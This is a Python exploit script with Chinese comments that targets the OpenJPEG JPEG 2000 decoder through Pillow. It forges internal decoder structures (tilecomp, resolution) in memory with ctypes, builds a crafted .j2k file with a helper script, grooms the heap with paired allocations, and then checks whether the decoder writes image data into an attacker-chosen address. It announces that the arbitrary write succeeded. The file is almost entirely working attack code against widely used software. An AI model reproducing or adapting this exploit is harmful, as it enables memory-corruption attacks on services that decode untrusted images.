#!/usr/bin/env python3
# 静默迭代：把 tile->comps(+0x18) 指向我们伪造的 opj_tcd_tilecomp_t
#   伪造结构里 data(+0x30) = SCRATCH（预填哨兵）=> 解码器自己把像素写进去
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value


def W(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


SENT = 0xA5

# ---- 1) 舞台：scratch（哨兵）+ 伪造 tilecomp + 伪造 resolution ----
scratch = bytearray(8192)
for i in range(len(scratch)):
    scratch[i] = SENT
SCRATCH = ctypes.addressof((ctypes.c_char * 8192).from_buffer(scratch))

fake = bytearray(1024)                     # 伪造的 opj_tcd_tilecomp_t（112 字节足够）
FAKE = ctypes.addressof((ctypes.c_char * 256).from_buffer(fake))
res = bytearray(512)                       # 伪造的 opj_tcd_resolution_t（40 字节）
RES = ctypes.addressof((ctypes.c_char * 64).from_buffer(res))

print("[*] SCRATCH=%#x  FAKE=%#x  RES=%#x" % (SCRATCH, FAKE, RES))
if max(SCRATCH, FAKE, RES) >= 0x1000000:
    print("[!] 地址超出可表达范围"); sys.exit(1)


def put64(addr, off, val):
    W(addr + off, val)


# ---- 伪造 tilecomp 字段（对象起点 = FAKE）----
put64(FAKE, 0x00, 0)                 # x0/y0 (int 对)
put64(FAKE, 0x08, 0)                 # x1/y1
put64(FAKE, 0x10, 1)                 # compno=1, numresolutions=1
put64(FAKE, 0x18, 1)                 # minimum_num_resolutions=1
put64(FAKE, 0x20, RES)               # resolutions -> 伪造的零结构
put64(FAKE, 0x28, 40)                # resolutions_size
put64(FAKE, 0x30, SCRATCH)           # ★ data -> 我们的 scratch
put64(FAKE, 0x38, 0)                 # ownsData = 0（别 free 我们）
put64(FAKE, 0x40, 4096)              # data_size_needed
put64(FAKE, 0x48, 4096)              # data_size
put64(FAKE, 0x50, 0)                 # data_win
put64(FAKE, 0x58, 0)                 # win_*
put64(FAKE, 0x68, 0)                 # numpix
# 伪造 resolution：全 0（numbands=0 => 不进 cblk 循环）
# 但把 pw/ph 设 1，x1/y1 设 16，避免除法/循环异常
W(RES + 0x08, 16)      # x1
W(RES + 0x0C, 16)      # y1
W(RES + 0x10, 1)       # pw
W(RES + 0x14, 1)       # ph

print("[*] fake.data=%#x  fake.resolutions=%#x" % (R(FAKE + 0x30), R(FAKE + 0x20)))

# ---- 2) A = FAKE - 0x0c（实测映射：comps = A + 0x0c）----
A = FAKE - 0x0c
B = A + 0x1000
C = A + 0x4000
print("[*] A=%#x B=%#x C=%#x  文件将约 %d MB" % (A, B, C, (C + 0x40000) // 1048576))

r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/FT.j2k', '0', '23',
                    hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:70])
if 'OK' not in r.stdout:
    sys.exit(1)

# ---- 3) groom：单一空洞（数组落进 => 正下方是 tiles[]）----
gc.collect()
prime = [bytes(519) for _ in range(1024)]
del prime
pairs = []
for _ in range(400):
    pairs.append((bytes(519), bytes(bytearray(519))))
good = [(D, Bb) for (D, Bb) in pairs if id(Bb) - id(D) == 0x230]
print("[*] 相邻对 =", len(good))
if not good:
    sys.exit(0)
keep = [t for i, t in enumerate(good) if i != len(good) // 2]
Ks = [Bb for (D, Bb) in keep]
holeD = good[len(good) // 2][0]
del holeD, pairs, good
gc.collect()

# ---- 4) 解码 ----
M = open('/tmp/FT.j2k', 'rb').read()
ok = None
try:
    im = Image.open(io.BytesIO(M)); im.load()
    ok = im.size
    print("[*] 解码成功:", im.size, im.mode)
except BaseException as e:
    print("[*] 解码异常:", repr(e)[:80])

# ---- 5) 检查 scratch 是否被写 ----
same = sum(1 for i in range(0, 8192) if scratch[i] == SENT)
print("[*] scratch 未被改动的字节数 = %d / 8192" % same)
if same < 8192:
    print("[+] scratch 被写入！前 32 字节:", bytes(scratch[:32]).hex())
    print("[+] 非哨兵字节数 = %d" % (8192 - same))
    print("\n★★★ 服务器驱动写成立：解码器把数据写进了【我们指定的地址】")
else:
    print("[-] scratch 未被写入")